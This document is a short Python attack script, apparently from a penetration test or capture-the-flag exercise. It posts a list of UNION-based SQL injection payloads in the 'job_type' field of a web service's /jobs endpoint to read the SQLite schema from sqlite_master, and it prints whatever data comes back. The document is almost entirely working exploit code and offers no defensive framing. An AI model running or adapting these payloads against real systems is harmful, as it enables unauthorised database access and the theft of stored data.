#!/usr/bin/env python3
import requests

url = "http://192.168.31.233:8000/jobs"
headers = {"Content-Type": "application/json"}

print("[*] Attempting to extract database schema via SQL injection...\n")

# Try to get table names using UNION
# The query likely returns 4 columns: id, name, type, description
payloads = [
    # Extract table names from sqlite_master
    "xxx' UNION SELECT name,type,sql,sql FROM sqlite_master WHERE type='table'--",
    "xxx' UNION SELECT tbl_name,name,sql,type FROM sqlite_master--",
    "xxx' UNION SELECT sql,name,type,tbl_name FROM sqlite_master--",

    # Try with different number of columns
    "xxx' UNION SELECT name,NULL,NULL,NULL FROM sqlite_master WHERE type='table'--",
    "xxx' UNION SELECT NULL,name,NULL,NULL FROM sqlite_master WHERE type='table'--",
    "xxx' UNION SELECT NULL,NULL,name,NULL FROM sqlite_master WHERE type='table'--",
    "xxx' UNION SELECT NULL,NULL,NULL,name FROM sqlite_master WHERE type='table'--",
]

for i, payload in enumerate(payloads, 1):
    try:
        data = {"job_type": payload}
        resp = requests.post(url, headers=headers, json=data, timeout=5)

        print(f"[{i}] Status: {resp.status_code}")
        if resp.status_code == 200:
            try:
                result = resp.json()
                if result and len(result) > 0:
                    print(f"    ✓ SUCCESS! Found data:")
                    for item in result:
                        print(f"      {item}")
                else:
                    print(f"    Empty result")
            except:
                print(f"    Response: {resp.text[:200]}")
        else:
            print(f"    Failed: {resp.text[:50]}")
        print()
    except Exception as e:
        print(f"    Error: {e}\n")

print("[*] Extraction complete!")
